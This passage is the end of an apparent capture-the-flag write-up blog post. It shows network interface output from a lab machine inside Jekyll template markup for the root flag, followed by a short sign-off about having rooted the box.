    inet 10.129.7.5/16 brd 10.129.255.255 scope global dynamic noprefixroute eth0
       valid_lft 3116sec preferred_lft 2666sec
    inet6 dead:beef::65a:410a:61f3:e7ed/64 scope global dynamic mngtmpaddr noprefixroute 
       valid_lft 86392sec preferred_lft 14392sec
    inet6 fe80::5eb3:7b7d:ac54:9838/64 scope link 
       valid_lft forever preferred_lft forever
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=rootflag %}

<br />
We dominated this box so hard that it snapped!  Hope you enjoyed the read.  See you in the next one.